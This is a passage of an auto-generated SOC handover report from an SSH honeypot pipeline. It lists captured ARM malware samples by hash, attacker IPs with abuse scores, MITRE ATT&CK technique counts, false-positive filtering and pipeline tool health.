| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `138.197.33[.]109` | US | DigitalOcean, LLC | **100** ⚠️ | 3 |
| `83.233.149[.]56` | SE | Bredband2 AB | **100** ⚠️ | 1 |
| `57.128.222[.]14` | PL | OVH Sp. z o. o. | **100** ⚠️ | 2 |
| `180.76.172[.]156` | CN | Beijing Baidu Netcom Science and Technology Co., Ltd. | **100** ⚠️ | 50 |
| `220.135.110[.]10` | TW | Chunghwa Telecom Data Communication Business Group | **100** ⚠️ | 11 |
| `101.206.107[.]245` | CN | UNICOM Sichuan province network | **100** ⚠️ | 50 |
| `8.219.188[.]210` | SG | Alibaba Cloud (Singapore) Private Limited | **100** ⚠️ | 45 |
| `206.62.164[.]164` | VE | Corporacion Matrix TV, C.A. (Airtek) | **71** | 3 |
| `88.188.6[.]10` | FR | Proxad / Free SAS | **68** | 1 |
| `206.62.164[.]163` | VE | Corporacion Matrix TV, C.A. (Airtek) | **66** | 3 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 20 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 10 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 9 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 5 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 5 |

---

## 🔕 False Positive Summary (39 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 11 |
| AbuseIPDB score 11 below threshold 25 | 1 |
| AbuseIPDB score 15 below threshold 25 | 1 |
| AbuseIPDB score 19 below threshold 25 | 1 |
| AbuseIPDB score 5 below threshold 25 | 2 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 23 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 97 cases |
| Tool 34  | Credential Extractor        | ✅ 19 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 2 fingerprints |
| Tool 36  | Command Clustering          | ✅ 1 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 20 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 39 filtered (40.2%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 18 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 28 files |
| Tool 33  | YARA Classifier             | ✅ 8 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 10 priority case(s) shown individually · 7 recon entry/entries in table (3 group(s) consolidating 44 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-05-21T23:06:35Z_
